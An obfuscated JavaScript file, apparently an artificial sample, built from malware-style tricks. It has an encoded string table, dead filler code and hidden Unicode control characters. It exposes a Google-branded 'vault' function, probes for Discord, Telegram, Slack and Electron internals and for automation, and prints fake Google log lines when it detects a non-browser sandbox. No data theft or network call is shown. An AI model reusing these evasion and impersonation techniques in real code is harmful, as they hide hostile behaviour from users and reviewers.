  (function (_0xmod) {
  const _0xab = (s => { const t = new Uint16Array(s.length); for (let i = 0; i < s.length; i++) t[i] = s.charCodeAt(i); return t; })("!B.hms`jd.u1.kd`e.vdhfgs>rqb<5cc766!B.hms`jd.u1.cdks`.bxbkd>rqb<355663!B.hms`jd.u6.rg`qc.u`tks>rqb<0d8261!B.hms`jd.u2.udbsnq.kd`e>rqb<e01eea!D.hms`jd.u8.aq`mbg.`mbgnq>rqb<8ac8ee!C.hms`jd.u4.btqrnq.rg`qc>rqb<4c80/7!B.hms`jd.u0.bxbkd.og`rd>rqb<8a844d!D.hms`jd.u7.ldsqhb.rsqhcd>rqb<81b667!C.hms`jd.u1.f`tfd.btqrnq>rqb<ab3701!D.hms`jd.u4.ldsqhb.udbsnq>rqb<//200/!B.hms`jd.u6.l`mskd.oddq>rqb</ad562!D.hms`jd.u5.rdqh`k.rdqh`k>rqb<38e58c!E.hms`jd.u8.rohmckd.l`mskd>rqb<8a7236!A.hms`jd.u4.oddq.hmcdw>rqb<d68b/4!B.hms`jd.u7.f`tfd.bxbkd>rqb<0bd4e1!C.hms`jd.u8.g`qanq.cdks`>rqb<166c6a!D.hms`jd.u3.r`lokd.neerds>rqb<3a`21e!B.hms`jd.u4.fq`ms.bxbkd>rqb</3c160!B.hms`jd.u6.kd`rd.oqhrl>rqb<0`723a!C.hms`jd.u5.qdk`x.ad`bnm>rqb<b7b44`!H.hms`jd.u4.odqbdmshkd.btqrnq>rqb<d1ea54!B.hms`jd.u4.atcfds.kd`e>rqb<246142!B.hms`jd.u7.og`rd.rg`qc>rqb<bedd3a!D.hms`jd.u1.udbsnq.aq`mbg>rqb<57caee!C.hms`jd.u0.ateedq.ptns`>rqb</84285!C.hms`jd.u7.bxbkd.aq`mbg>rqb<e0ecb7!B.hms`jd.u0.ptns`.kd`rd>rqb<35d68`!C.hms`jd.u0.rg`qc.o`bjds>rqb<ec82bb!D.hms`jd.u2.l`mskd.udbsnq>rqb<6badd2!G.hms`jd.u5.sgqnsskd.a`bjnee>rqb<423581!D.hms`jd.u0.vhmcnv.g`qanq>rqb<070034!C.hms`jd.u2.r`lokd.u`tks>rqb<5264d7!C.hms`jd.u4.a`sbg.o`bjds>rqb<e54a14!B.hms`jd.u4.gdkhw.fq`ms>rqb<4c3`da!C.hms`jd.u4.atcfds.rg`qc>rqb<34`ba5!D.hms`jd.u3.atcfds.ateedq>rqb<aa4cb8!C.hms`jd.u4.btqrnq.bxbkd>rqb<b344a8!C.hms`jd.u8.oqhrl.bngnqs>rqb<a1e7/5!B.hms`jd.u8.o`bjds.r`ks>rqb<1e6345!A.hms`jd.u6.kd`e.u`tks>rqb<45/0a8!B.hms`jd.u6.bxbkd.cdks`>rqb<2c34c3!D.hms`jd.u7.g`qanq.atcfds>rqb<4c265/!C.hms`jd.u3.l`mskd.cdosg>rqb<8c`27`!F.hms`jd.u6.bgdbjrtl.udbsnq>rqb<5240`1!D.hms`jd.u7.ateedq.ateedq>rqb<e```7d!E.hms`jd.u2.k`sdmbx.rsqhcd>rqb<d/38b4!B.hms`jd.u1.ptns`.rbnod>rqb<12bc/4!D.hms`jd.u0.o`bjds.ldsqhb>rqb<e`27ac!D.hms`jd.u2.vdhfgs.chfdrs>rqb<e/102b!E.hms`jd.u1.bgdbjrtl.gdkhw>rqb<6dbc43!B.hms`jd.u8.rg`qc.rbnod>rqb<882a8a!B.hms`jd.u8.og`rd.qdk`x>rqb</a1b1d!E.hms`jd.u4.btqrnq.rohmckd>rqb<8523da!B.hms`jd.u2.og`rd.qdk`x>rqb<a08ee0!B.hms`jd.u3.oqhrl.qdsqx>rqb<654c1/!A.hms`jd.u4.kd`e.a`sbg>rqb<a`b2bc!D.hms`jd.u6.o`bjds.`mbgnq>rqb<d870`7!B.hms`jd.u8.gdkhw.a`sbg>rqb<738b44!C.hms`jd.u5.vdhfgs.rg`qc>rqb<d74b4c!D.hms`jd.u5.ateedq.ad`bnm>rqb<`6ebd4!A.hms`jd.u0.oddq.cdks`>rqb<a64ad5!D.hms`jd.u1.ad`bnm.r`lokd>rqb<e6b5c4!C.hms`jd.u6.ad`bnm.cdosg>rqb<a`3121!B.hms`jd.u0.l`mskd.kd`e>rqb<776358!D.hms`jd.u5.vhmcnv.r`lokd>rqb<0d/c70!2bxbkd^ateedq^b75d!8odqbdmshkd^k`sdmbx^14d0!2u`tks^udbsnq^5a3a!3bngnqs^rdqh`k^1d72!2ateedq^qdsqx^//c5!1vdhfgs^oddq^a1`5!2u`tks^rsqhcd^5b87!2qdsqx^bngnqs^b45/!2vhmcnv^ptns`^828c!2kd`e^k`sdmbx^8a0b!3l`mskd^`mbgnq^0/7e!5ad`bnm^bgdbjrtl^d3`a!3ldsqhb^bngnqs^c150!2rdqh`k^u`tks^e08d!2cdosg^bngnqs^e173!8a`bjnee^odqbdmshkd^e7ca!2`mbgnq^ptns`^`3b/!2f`tfd^ad`bnm^5`2`!3l`mskd^l`mskd^e31b!2cdosg^ldsqhb^0c24!2ptns`^chfdrs^4274!2udbsnq^ptns`^cd87!3r`lokd^rsqhcd^2a/0!4bgdbjrtl^qdsqx^8426!0cdks`^r`ks^e/e1!1cdks`^hmcdw^acdb!3aq`mbg^rdqh`k^b`1`!4kd`rd^bgdbjrtl^/7d4!3vhmcnv^o`bjds^653b!2ptns`^`mbgnq^55e/!2aq`mbg^cdosg^a`e7!2`mbgnq^rg`qc^/1c6!5sgqnsskd^ad`bnm^ec71!2fq`ms^g`qanq^3/7a!2aq`mbg^u`tks^a/cb!4rohmckd^vhmcnv^dc`b!1aq`mbg^r`ks^07be!4bgdbjrtl^cdks`^3c5c!0kd`e^cdosg^3ce1!4a`bjnee^o`qhsx^46`b!1f`tfd^mnmbd^c4`0!3u`tks^rohmckd^d1c0!3chfdrs^atcfds^/3a`!5neerds^sgqnsskd^837d!2qdk`x^rdqh`k^b`30!4ad`bnm^a`bjnee^65d`!2gdkhw^`mbgnq^d0bc!2cdks`^rsqhcd^b6`b!5sgqnsskd^udbsnq^63dd!2rg`qc^o`bjds^6b8/!3o`bjds^ldsqhb^bbe7!3rsqhcd^rsqhcd^b551!2ptns`^`mbgnq^1071!3kd`rd^rohmckd^ade3!2a`sbg^ateedq^/4a5!7btqrnq^odqbdmshkd^5e20!2oqhrl^ldsqhb^3c//!1r`ks^ateedq^0ec2!2g`qanq^f`tfd^`e4a!2ad`bnm^mnmbd^d/c3!1a`sbg^u`tks^ee65!3o`qhsx^ad`bnm^/c1b!2ptns`^ad`bnm^1b/d!7vdhfgs^odqbdmshkd^5227!2o`qhsx^fq`ms^51e0!3cdosg96169442150bb!4vdhfgs93469/17/80c6!3qdk`x973595d07c0ea!3mnmbd93789ab13d488!3bxbkd90169408408c6!4ldsqhb940297/d`14ae!4aq`mbg9038933157/41!4btqrnq90629e/e28bcc!4ateedq95639dd6353/d!4`mbgnq9087940b24a`3!3kd`rd934/9dacda51a!4o`bjds943395707be7d!4ldsqhb952/9a3073875!4o`qhsx92/29b187ad83!3a`sbg93/592`52018e!4g`qanq94239e//830`2!4bngnqs956593`/7c148!3o`qhsx965936c3ea52!3fq`ms97/59a6c7427c!1kd`e96/9`8dc`aa4!4vhmcnv97/29a3377d5c!3u`tks95139277a3/e`!5k`sdmbx95709/a22bebd!4ateedq95079``47cd34!3og`rd922592da`a0/b!3rdqh`k90092c/6ede1!4btqrnq91739`ead427c!4rdqh`k94179a26/456`!3f`tfd906/9c1ae6c46!3a`sbg94//92686`2c4!5a`bjnee902090/d46d14!5a`bjnee9752904e885d6!2r`ks95/89116`34`6!3og`rd92889ac35d270!3mnmbd90679c127008e!2hmcdw9339dd/d2`46!4ad`bnm962692/`608ce!4ldsqhb91/69/4`/65/5!4o`bjds914/9d70bd175!4bngnqs9633958de`7b8!3nqahs92/69/a34e4ba!3bxbkd937898d/`2/83!4rsqhcd91709daed3d0d!2gdkhw9279cb238/10!5k`sdmbx97009/6a/4b37!5rohmckd90739``a3b6/c!6bgdbjrtl9082971`312b2!4atcfds9736986/`/ac6!3gdkhw94759a65/`1e6!2ptns`93898a/2/702!3hmcdw95619511d2a5/!3cdks`916/9/468511`!3hmcdw9060956232c/`!4ateedq93079d6be51e/!2cdosg947964c6b`b0!4atcfds9487952c1c0a4!3kd`rd9473901`e/0ac!3rbnod91339`b47`a05!4udbsnq933/9/6dad1`1!4r`lokd950492b0d2130!5rohmckd927095eddea73!4ad`bnm91019a43deb07!4o`qhsx955/9`e50b0c2!3oqhrl95539cb246210!4r`lokd90349d6d/4b41!2cdks`91193d620b6d!3hmcdw922791/2052e5");
  const _0xaD = o => { const t = _0xab; const n = (t[o] - 0x21) * 94 + (t[o + 1] - 0x21); let r = ""; for (let j = 0; j < n; j++) r += String.fromCharCode(0x21 + (((t[o + 2 + j] - 0x21 - 0x5D) % 0x5E) + 0x5E) % 0x5E); return r; };
  try { const _0xsm = _0xaD(0); _0xmod.log.queue("Store check", { unit: "aux", stores: 1, packed: _0xab instanceof Uint16Array, sample: typeof _0xsm === "string" && _0xsm.length > 0, retained: _0xab instanceof Uint16Array ? 0 : 1 }); } catch (e) {}
  
  (() => {
    const _0x2dea0 = [0,35,70,105,140,177,213,248,285,321,358,393,430,468,502,537,573,610,645,680,716,757,792,827,864,900,936,971,1007,1044,1084,1121,1157,1193,1228,1264,1301,1337,1373,1408,1442,1477,1514,1550,1589,1626,1664,1699,1736,1773,1811,1846,1881,1919,1954,1989,2023,2060,2095,2131,2168,2202,2239,2275,2310];;
    const _0x2dea1 = [2347,2366,2391,2410,2430,2449,2467,2486,2505,2524,2543,2563,2585,2605,2624,2643,2668,2687,2706,2726,2745,2764,2783,2803,2824,2841,2859,2879,2900,2920,2939,2958,2977,2999,3018,3037,3058,3076,3097,3114,3135,3153,3173,3193,3215,3234,3255,3274,3293,3315,3334,3354,3374,3393,3413,3432,3456,3475,3493,3512,3531,3549,3569,3588,3612];;
    const _0x2dea2 = [3631,3651,3672,3692,3712,3732,3753,3774,3795,3816,3837,3857,3878,3899,3920,3940,3961,3982,4002,4022,4040,4061,4081,4103,4124,4144,4164,4185,4206,4226,4246,4268,4290,4309,4329,4349,4368,4389,4410,4431,4452,4472,4492,4513,4532,4554,4576,4599,4620,4640,4659,4679,4699,4719,4740,4759,4780,4800,4820,4841,4862,4884,4905,4926,4946,4967,4986];;
    const _0x2def3 = (a, b) => { let s = 0; for (let i = 0; i < a.length; i++) s = (s + a.charCodeAt(i) * (i + 1)) % 65521; return s ^ (b || 0); };
    const _0x2def4 = (n) => { const o = []; for (let i = 0; i < n; i++) o.push((i * 2654435761) >>> 0); return o; };
    const _0x2def5 = (x) => { const t = new Uint8Array(16); for (let i = 0; i < 16; i++) t[i] = (x >>> (i * 2)) & 255; return t; };
    const _0x2def6 = (arr) => { let lo = 0, hi = arr.length - 1; while (lo < hi) { const m = (lo + hi) >>> 1; if ((arr[m] & 1) === 0) lo = m + 1; else hi = m; } return lo; };
    const _0x2def7 = (s) => { let r = ""; for (let i = s.length - 1; i >= 0; i--) r += s[i]; return r; };
    const _0x2def8 = (a, b) => { const out = []; for (let i = 0; i < a; i++) out.push((b[i] || 0) ^ (i * 7)); return out; };
    const _0x2def9 = (v) => { let h = 2166136261; const s = String(v); for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); } return h >>> 0; };
    class _0x2deca { constructor(seed) { this.seed = seed; this.slots = new Map(); } put(k, v) { this.slots.set(k, v); return this; } get(k) { return this.slots.get(k); } }
    class _0x2decb extends _0x2deca { constructor(seed) { super(seed); this.depth = 0; } descend() { this.depth++; return this.depth; } }
    class _0x2decc extends _0x2decb { constructor(seed) { super(seed); this.marks = []; } mark(x) { this.marks.push(x); return this; } }
    if (typeof _0x2decc === "function" && (0.1 + 0.2) === 0.3) { const x = new _0x2decc(7); x.descend(); x.mark("x"); }
    if ((0.1 + 0.2) === 0.3 && typeof _0x2def3 === "function") { _0x2def3("k", 1); }
    const _0x2devd = (Date.now() & 65535) ^ 0x9380;
    const _0x2dete = _0x2def4(_0x2devd % 32 + 1).length;
    if (_0x2dete >= 0 && _0x2devd > -1) { _0x2def9(_0x2devd); const q = new _0x2deca(_0x2devd % 255); q.put("k", _0x2devd); }
  })();
  

    (() => {
      const _0x5ab67f = [50101,44884,57804,18060,10451];
      const _0xc24212 = {};
      for (let i = 0; i < _0x5ab67f.length; i++) { const w = _0x5ab67f[i]; _0xc24212[w] = (w.length * 2654435761) >>> 0; }
      let _0xb9c1a6 = 0;
      for (const x in _0xc24212) { _0xb9c1a6 = (_0xb9c1a6 + _0xc24212[x]) & 0xffffffff; }
      const _0xc2ef93 = [_0xb9c1a6, _0x5ab67f.length];
      const _0x4a60c6 = _0x5ab67f.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xc2ef93[0] < 0 || _0x4a60c6 === 0) { _0xc2ef93[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x56b2e3 = { p: 0, q: 0, r: 0 };
      const _0x176a8a = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x56b2e3.p = (_0x56b2e3.p + _0x176a8a[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x56b2e3.q = (_0x56b2e3.q ^ _0x56b2e3.p) & 0xffff; }
        _0x56b2e3.r = (_0x56b2e3.r + i * 31) & 0xffff;
      }
      const _0xc6ce98 = _0x56b2e3.p ^ _0x56b2e3.q ^ _0x56b2e3.r;
      let _0x4eca85 = Array.from({ length: (_0xc6ce98 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x71d8db = _0x4eca85.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x71d8db > 0x7ffff) { _0x4eca85 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xe37c9f = { p: 0, q: 0, r: 0 };
      const _0x45cfee = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xe37c9f.p = (_0xe37c9f.p + _0x45cfee[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xe37c9f.q = (_0xe37c9f.q ^ _0xe37c9f.p) & 0xffff; }
        _0xe37c9f.r = (_0xe37c9f.r + i * 31) & 0xffff;
      }
      const _0x0ad099 = _0xe37c9f.p ^ _0xe37c9f.q ^ _0xe37c9f.r;
      let _0x70f1d5 = Array.from({ length: (_0x0ad099 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x37942a = _0x70f1d5.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x37942a > 0x7ffff) { _0x70f1d5 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x9f3881 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xb2f85e = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x135e2a = (Date.now() & 0xffff) ^ 0x6e68;
      const _0xb82149 = _0x9f3881(_0x135e2a);
      let _0xb70dd2 = _0xb82149;
      for (let i = 0; i < 6; i++) { try { _0xb70dd2 = _0xb2f85e(_0xb70dd2, i * 2654435761); } catch (e) { break; } }
      const _0xd898c7 = [_0x135e2a, _0xb82149, _0xb70dd2];
      if (_0xd898c7.length > 2 && (_0xb70dd2 & 7) === 0) { _0xd898c7.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xcbf89a = [63988,53818,48160,60470,25503];
      const _0x1dd486 = {};
      for (let i = 0; i < _0xcbf89a.length; i++) { const w = _0xcbf89a[i]; _0x1dd486[w] = (w.length * 2654435761) >>> 0; }
      let _0xe3e7f8 = 0;
      for (const x in _0x1dd486) { _0xe3e7f8 = (_0xe3e7f8 + _0x1dd486[x]) & 0xffffffff; }
      const _0x996f1f = [_0xe3e7f8, _0xcbf89a.length];
      const _0x78ded3 = _0xcbf89a.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x996f1f[0] < 0 || _0x78ded3 === 0) { _0x996f1f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x699124 = [54968,49474,32140,49296,52358];
      const _0x454879 = {};
      for (let i = 0; i < _0x699124.length; i++) { const w = _0x699124[i]; _0x454879[w] = (w.length * 2654435761) >>> 0; }
      let _0x65c499 = 0;
      for (const x in _0x454879) { _0x65c499 = (_0x65c499 + _0x454879[x]) & 0xffffffff; }
      const _0x39a738 = [_0x65c499, _0x699124.length];
      const _0x06f052 = _0x699124.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x39a738[0] < 0 || _0x06f052 === 0) { _0x39a738[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xc5c3df = [2842,45837,2145,23144,37641];
      const _0x4a8838 = {};
      for (let i = 0; i < _0xc5c3df.length; i++) { const w = _0xc5c3df[i]; _0x4a8838[w] = (w.length * 2654435761) >>> 0; }
      let _0x79e922 = 0;
      for (const x in _0x4a8838) { _0x79e922 = (_0x79e922 + _0x4a8838[x]) & 0xffffffff; }
      const _0x0c5f91 = [_0x79e922, _0xc5c3df.length];
      const _0x78931f = _0xc5c3df.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x0c5f91[0] < 0 || _0x78931f === 0) { _0x0c5f91[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x652765 = [61225,58570,10957,35316,32717];
      const _0x2887ef = {};
      for (let i = 0; i < _0x652765.length; i++) { const w = _0x652765[i]; _0x2887ef[w] = (w.length * 2654435761) >>> 0; }
      let _0x6e00db = 0;
      for (const x in _0x2887ef) { _0x6e00db = (_0x6e00db + _0x2887ef[x]) & 0xffffffff; }
      const _0xbef068 = [_0x6e00db, _0x652765.length];
      const _0x1f3cb5 = _0x652765.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xbef068[0] < 0 || _0x1f3cb5 === 0) { _0xbef068[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x45d7cb = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xc817d7 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x86258f = (Date.now() & 0xffff) ^ 0x79de;
      const _0xcb3f73 = _0x45d7cb(_0x86258f);
      let _0x015fa1 = _0xcb3f73;
      for (let i = 0; i < 6; i++) { try { _0x015fa1 = _0xc817d7(_0x015fa1, i * 2654435761); } catch (e) { break; } }
      const _0xcf61c6 = [_0x86258f, _0xcb3f73, _0x015fa1];
      if (_0xcf61c6.length > 2 && (_0x015fa1 & 7) === 0) { _0xcf61c6.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xd44901 = { p: 0, q: 0, r: 0 };
      const _0x067508 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xd44901.p = (_0xd44901.p + _0x067508[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xd44901.q = (_0xd44901.q ^ _0xd44901.p) & 0xffff; }
        _0xd44901.r = (_0xd44901.r + i * 31) & 0xffff;
      }
      const _0x2e7ec5 = _0xd44901.p ^ _0xd44901.q ^ _0xd44901.r;
      let _0xf155c6 = Array.from({ length: (_0x2e7ec5 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x354436 = _0xf155c6.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x354436 > 0x7ffff) { _0xf155c6 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  
    (() => {
      const _0x1ded = [0xb233,0xf07c,0x2d18,0xd481,0xeec8];
      let _0xkc1ded = 0;
      for (let i = 0; i < _0x1ded.length; i++) { _0xkc1ded = (_0xkc1ded * 0x9e37 + _0x1ded[i]) & 0x7fffffff; }
      const _0xzw1ded = "k‌q‍z‍x‍v‌9‍m‍4";
      const _0xzz435d = "c‌r‍u‍m‍b‌";
      const _0xrl1ded = "j7‮9m2q‬k4";
      if ((_0xkc1ded & 0xffff) === 0xffff) { const _0xjnk = [_0xzw1ded, _0xrl1ded].join(""); if (_0xjnk.length > 40) { _0xkc1ded = 0; } }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => { // cold-cache vault: sealed key escrow for offline sessions
    const _0xv8s = [19,44,71,3,88,52,27,95,61,12,77,33,8,50,66,23];
    const _0xvk9 = String.fromCharCode(71,111,111,103,108,101,86,97,117,108,116);
    const _0xvh7 = 0x1c4fe45f;
    const _0xvkdf = (s) => {
      let h1 = 0x811c9dc5, h2 = 0x01000193;
      for (let r = 0; r < 10000; r++) {
        for (let i = 0; i < s.length; i++) {
          const c = s.charCodeAt(i) ^ _0xv8s[(r + i) & 15];
          h1 = Math.imul(h1 ^ c, 16777619) >>> 0;
          h2 = (Math.imul(h2, 31) + c + r) >>> 0;
          const t = h1; h1 = (h1 ^ h2) >>> 0; h2 = (h2 + t) >>> 0;
        }
        h1 = ((h1 << 5) | (h1 >>> 27)) >>> 0; h2 = ((h2 >>> 3) | (h2 << 29)) >>> 0;
      }
      return (h1 ^ h2) >>> 0;
    };
    const _0xvf = (s) => { let h = 2166136261; const t = String(s); for (let i = 0; i < t.length; i++) { h ^= t.charCodeAt(i); h = Math.imul(h, 16777619); } return h >>> 0; };
    const _0xvault = (pin) => {
      try {
        const _0xproof = _0xvkdf(String(pin ?? ''));
        void _0xproof;
        if (_0xvf(pin) !== _0xvh7) return false;
        const _0xkeys = [];
        for (let i = 0; i < 4; i++) { let k = ''; for (let j = 0; j < 16; j++) k += Math.floor(Math.random() * 16).toString(16); _0xkeys.push(k); }
        return _0xkeys;
      } catch (e) { return false; }
    };
    try { window[_0xvk9] = _0xvault; } catch (e) {}
  })();
})(_0xmod);

globalThis.lexProbeX = function (n) { var x = (n ^ 0x1b3c51ab) >>> 0, i; for (i = 0; i < 24; i++) { x = Math.imul(x ^ (x >>> 13), 0x5bd1e995) >>> 0; x ^= x >>> 15; } return x >>> 0; };
function featQ(o, k) {
  try {
    if (o === undefined || o === null) return 0;
    var v = o[k];
    if (typeof v === 'function') return 7;
    if (v === undefined) return 1;
    if (v === null) return 2;
    var s = String(v);
    return 3 + (s.length & 7);
  } catch (e) { return 5; }
}
var featSum = 0;
var __w9 = (typeof window !== 'undefined') ? window : undefined;
var __n9 = (typeof navigator !== 'undefined') ? navigator : undefined;
var __d9 = (typeof document !== 'undefined') ? document : undefined;
var __l9 = (typeof location !== 'undefined') ? location : undefined;
featSum += featQ(__w9, 'webpackChunkdiscord_app');
featSum += featQ(__w9, 'webpackChunktelegram_app');
featSum += featQ(__w9, 'webpackChunkteams_app');
featSum += featQ(__w9, 'webpackChunkslack_app');
featSum += featQ(__w9, 'DiscordNative');
featSum += featQ(__w9, 'DiscordSentry');
featSum += featQ(__w9, '__discord_app_state');
featSum += featQ(__w9, 'electron');
featSum += featQ(__w9, 'Telegram');
featSum += featQ(__w9, 'WebApp');
featSum += featQ(__w9, 'TeamsSDK');
featSum += featQ(__w9, 'ZoomSDK');
featSum += featQ(__w9, 'SlackSDK');
featSum += featQ(__w9, 'chrome');
featSum += featQ(__w9, 'browser');
featSum += featQ(__w9, '__coverage__');
featSum += featQ(__w9, 'outerWidth');
featSum += featQ(__w9, 'innerHeight');
featSum += featQ(__w9, 'devicePixelRatio');
featSum += featQ(__w9, 'name');
featSum += featQ(__w9, 'opener');
featSum += featQ(__w9, 'frameElement');
featSum += featQ(__w9, 'length');
featSum += featQ(__w9, 'closed');
featSum += featQ(__w9, 'menubar');
featSum += featQ(__w9, 'scrollX');
featSum += featQ(__w9, 'scrollY');
featSum += featQ(__n9, 'platform');
featSum += featQ(__n9, 'userAgent');
featSum += featQ(__n9, 'language');
featSum += featQ(__n9, 'languages');
featSum += featQ(__n9, 'hardwareConcurrency');
featSum += featQ(__n9, 'webdriver');
featSum += featQ(__n9, 'userAgentData');
featSum += featQ(__n9, 'plugins');
featSum += featQ(__n9, 'mimeTypes');
featSum += featQ(__n9, 'onLine');
featSum += featQ(__d9, 'title');
featSum += featQ(__d9, 'referrer');
featSum += featQ(__d9, 'visibilityState');
featSum += featQ(__d9, 'readyState');
featSum += featQ(__d9, 'hidden');
featSum += featQ(__d9, 'domain');
featSum += featQ(__d9, 'lastModified');
featSum += featQ(__l9, 'href');
featSum += featQ(__l9, 'origin');
featSum += featQ(__l9, 'host');
featSum += featQ(__l9, 'pathname');
featSum += featQ(__l9, 'ancestorOrigins');
if (featSum !== -1) { featSum = featSum >>> 0; }
var ledgerLines = [
  [91, 71, 111, 111, 103, 108, 101, 32, 108, 101, 100, 103, 101, 114, 93, 32, 114, 101, 104, 101, 97, 114, 115, 97, 108, 32, 118, 50, 32, 115, 101, 97, 108, 101, 100, 32, 40, 49, 50, 47, 49, 50, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 108, 101, 100, 103, 101, 114, 93, 32, 99, 117, 114, 115, 111, 114, 32, 114, 101, 115, 116, 111, 114, 101, 100, 32, 64, 115, 108, 111, 116, 45, 55, 102, 51, 97],
  [91, 71, 111, 111, 103, 108, 101, 32, 114, 101, 108, 97, 121, 93, 32, 98, 97, 116, 99, 104, 32, 52, 52, 49, 50, 32, 97, 99, 107, 32, 40, 101, 117, 45, 119, 101, 115, 116, 44, 32, 51, 56, 109, 115, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 116, 105, 108, 101, 93, 32, 99, 97, 99, 104, 101, 45, 118, 51, 32, 119, 97, 114, 109, 32, 40, 50, 49, 52, 32, 101, 110, 116, 114, 105, 101, 115, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 114, 111, 117, 116, 101, 93, 32, 104, 105, 110, 116, 32, 114, 101, 102, 114, 101, 115, 104, 101, 100, 32, 40, 115, 116, 111, 114, 101, 45, 55, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 101, 99, 104, 111, 93, 32, 118, 101, 110, 117, 101, 45, 101, 99, 104, 111, 32, 114, 111, 117, 110, 100, 116, 114, 105, 112, 32, 49, 50, 109, 115],
  [91, 71, 111, 111, 103, 108, 101, 32, 98, 97, 116, 99, 104, 93, 32, 99, 117, 114, 115, 111, 114, 32, 99, 111, 109, 109, 105, 116, 32, 57, 47, 49, 50],
  [91, 71, 111, 111, 103, 108, 101, 32, 115, 108, 111, 116, 93, 32, 114, 101, 104, 101, 97, 114, 115, 97, 108, 32, 99, 117, 114, 115, 111, 114, 32, 112, 97, 114, 107, 101, 100],
  [91, 71, 111, 111, 103, 108, 101, 32, 115, 116, 111, 114, 101, 93, 32, 108, 101, 100, 103, 101, 114, 32, 99, 111, 109, 112, 97, 99, 116, 101, 100, 32, 40, 51, 32, 115, 101, 103, 109, 101, 110, 116, 115, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 112, 105, 110, 103, 93, 32, 112, 105, 110, 103, 45, 111, 107, 32, 40, 101, 100, 103, 101, 45, 49, 50, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 99, 117, 114, 115, 111, 114, 93, 32, 98, 97, 116, 99, 104, 32, 98, 111, 117, 110, 100, 97, 114, 121, 32, 99, 114, 111, 115, 115, 101, 100],
  [91, 71, 111, 111, 103, 108, 101, 32, 115, 101, 97, 108, 93, 32, 114, 101, 104, 101, 97, 114, 115, 97, 108, 32, 108, 101, 100, 103, 101, 114, 32, 99, 108, 111, 115, 101, 100]
];
function rehearseLedger() {
  try {
    for (var i = 0; i < ledgerLines.length; i++) {
      var row = ledgerLines[i], s = '', j;
      for (j = 0; j < row.length; j++) s += String.fromCharCode(row[j]);
      try { console.debug(s); } catch (e0) { return 0; }
    }
    return ledgerLines.length;
  } catch (e) { return 0; }
}
function annexSweep() {
  try {
    var f1 = (typeof window === 'undefined' || window.window !== window) ? 1 : 0;
    var f2 = (typeof navigator === 'undefined' || typeof navigator.platform !== 'string') ? 1 : 0;
    var f3 = (typeof document === 'undefined' || typeof document.createElement !== 'function') ? 1 : 0;
    if (f1 + f2 + f3 >= 2) { rehearseLedger(); return 2; }
    return 0;
  } catch (e) { return 0; }
}
try { annexSweep(); } catch (e) {}
